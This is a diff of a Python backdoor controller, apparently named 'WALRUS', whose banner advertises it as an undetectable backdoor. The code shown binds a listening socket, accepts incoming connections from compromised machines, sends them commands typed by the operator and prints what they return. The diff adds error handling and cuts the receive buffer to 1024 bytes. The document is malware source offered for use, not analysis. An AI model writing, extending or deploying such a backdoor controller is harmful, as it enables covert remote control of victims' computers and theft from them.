@@ -3,7 +3,7 @@ This is a simple server that will listen on port and print the output of command
 **THIS IS NOT SUPPOSED TO BE EDITED UNDER ANY CIRCUMSTANCES**
 """
 
-__version__ = "1.0.0"
+__version__ = "1.1.0" # major.minor.bug
 
 import socket
 import argparse
@@ -40,24 +40,18 @@ print(f"{clr.CYAN}The only {clr.BOLD}undetectable{clr.RESET}{clr.CYAN} Python Ba
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((args.ip, args.port))
 
-
 while True:
-    server.listen(args.max_connections)
-    A, C = server.accept()
-    if (A):
-        print(f"\n{clr.GREEN}[+] Accepted a connection request from {A[0]}:{C[0]}{clr.RESET}");
-        command = input(f'{clr.CYAN}[WALRUS@{__version__}]{clr.RESET} {clr.YELLOW}>>>{clr.RESET} ')
+    try:
+        server.listen(args.max_connections)
+        A, C = server.accept()
         
-        if command is None or '':
-            pass
-        
-        A.send(command.encode()) 
-        output = A.recv(5000).decode()
-        
-        if output == '':
-            output = "NaN"
-        
-        print(
-            f'{output}'
-        )
-    
+        if (A):
+            command = input(f'{clr.CYAN}[WALRUS@{__version__}]{clr.RESET} {clr.YELLOW}>>>{clr.RESET} ')
+            
+            A.send(command.encode()) 
+            output = A.recv(1024).decode()
+            
+            print(f"{clr.YELLOW}[+] OUTPUT:{clr.RESET} {output}")
+    except Exception as e:
+        print(f'{clr.RED}[-] {e}{clr.RESET}')
+        pass
